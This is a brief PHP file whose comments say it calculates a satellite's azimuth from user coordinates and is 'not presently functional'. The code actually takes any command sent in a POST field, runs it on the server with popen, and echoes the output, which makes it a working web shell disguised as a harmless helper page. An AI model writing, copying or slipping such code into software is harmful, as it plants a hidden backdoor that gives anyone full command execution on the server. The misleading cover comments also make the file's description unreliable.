<!-- azimuthCalculate.php -->
<!-- Author: J.R. Stooksbury, Date: 2/26/23 -->
<!-- Returns Azimuth Value of satellite based upon users coordinates, not presently functional, not a page for direct viewing -->
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $command = $_POST['command'];

    $handle = popen($command . ' 2>&1', 'r');
    if ($handle) {
        while (!feof($handle)) {
            $buffer = fgets($handle);
            $buffer = str_replace("\r\n", "\n", $buffer); // replace \r\n with \n
            echo nl2br($buffer); // convert newlines to HTML line breaks
            flush(); // flush the output buffer
        }
        pclose($handle);
    }
}
?>